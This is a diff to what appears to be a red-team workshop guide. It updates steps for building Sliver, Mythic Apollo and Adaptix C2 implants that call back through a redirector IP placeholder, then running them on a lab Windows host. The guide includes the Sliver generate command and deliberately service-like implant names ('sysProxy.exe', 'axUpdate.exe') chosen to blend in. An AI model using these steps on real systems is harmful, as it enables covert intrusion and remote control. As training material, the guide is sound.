@@ -92,19 +92,20 @@ jobs
 
 **Be sure to replace the `<REDIR_PUBLIC_IP>` with your actual redirector IP that can be found in `deployment_info.txt`.**
 
+> [!NOTE]
+> Cross-compilation takes **5 to 7 minutes** and will look like it is hung. It is not — let it run. **While waiting, skip ahead to Step B1** to get logged into Mythic so that time is not wasted.
+
 ```text
 generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/sysProxy.exe
 ```
 
-The `/cloud/storage/objects/` prefix is what the redirector matches, strips, and forwards to the Sliver HTTPS listener on 443. Wrong prefix = decoy. Cross-compile takes ~60 to 90 seconds.
+The `/cloud/storage/objects/` prefix is what the redirector matches, strips, and forwards to the Sliver HTTPS listener on 443. Wrong prefix = decoy.
 
 This is the only Sliver implant you build all workshop. It stays at `/tmp/sysProxy.exe` on the Sliver host and ATTACK reuses it against ShadowGate, so there is no regenerate step later. The name is deliberately service-like, first letter maps to the C2 (s = Sliver).
 
 **Success:** `[*] Implant saved to /tmp/sysProxy.exe`.
 
 **Failure:** SSH hang during generate points at an undersized instance (see Step A1). If it compiles but is owned by root and cannot be pulled, the umask override is missing (`/etc/systemd/system/sliver.service.d/umask.conf`).
-
-**While waiting for this to finish, lets skip ahead and get logged into Mythic>Step B1**
 
 ### Step A4. Transfer to Windows and execute
 
@@ -137,7 +138,7 @@ whoami
 ps
 ```
 
-**Success:** `whoami` returns `windows\administrator`; `ps` returns the process table. Leave this session connected. It is your Sliver heartbeat for the rest of the workshop; do not kill it.
+**Success:** `whoami` returns your machine's hostname and `administrator` (e.g. `EC2AMAZ-XXXXXXX\Administrator` — the hostname is instance-specific and will differ from the example); `ps` returns the process table. Leave this session connected. It is your Sliver heartbeat for the rest of the workshop; do not kill it.
 
 **Failure:** see the wiki Sliver > Troubleshooting > "Implant compiles but never calls back" for the ordered checklist (listener, network path, URL, header, Defender).
 
@@ -155,7 +156,7 @@ Left sidebar > **Create Payload**. The builder walks you through four sections i
 
 1. **Select OS** — choose `Windows`.
 2. **Select Payload** — choose `Apollo`. A **Continue from Existing Payload / Start Fresh** toggle appears; select **Start Fresh**.
-3. **Build Parameters** — set `Output Format` to `WinExe` and click next.
+3. **Build Parameters** — set `output_type` to `WinExe` and click next.
 4. **Commands** — keep the default set (`shell`, `ps`, `run`, `upload`) and add `whoami` and `ls`.
 	1. Find `whoami` on the left side, toggle it, and press the single arrow `>` to add it to the payload build. Do the same for `ls`. Click next.
 5. **C2 Profiles** — pick `http`, click **+ INCLUDE PROFILE**.
@@ -293,7 +294,13 @@ With the listener selected, open the agent generator (right-click the listener >
 
 Generate and save it as `axUpdate.exe` (service-like, a = Adaptix). Adaptix cross-compiles the Windows beacon with the mingw toolchain already installed on the teamserver.
 
-**Success:** `axUpdate.exe` is written (to the Windows host, or to the teamserver to pull as below).
+> [!NOTE]
+> The Adaptix client saves the beacon to `C:\Users\Administrator\AdaptixProjects\redStack\axUpdate.exe` by default, not the Desktop. Move it to the Desktop before executing so the path matches the next step:
+> ```powershell
+> Move-Item "C:\Users\Administrator\AdaptixProjects\redStack\axUpdate.exe" C:\Users\Administrator\Desktop\axUpdate.exe
+> ```
+
+**Success:** `axUpdate.exe` is on the Desktop.
 
 **Failure:** if generation errors, confirm the listener is running and the beacon extender built (`ls /opt/AdaptixC2/dist/extenders/` on the teamserver).
 
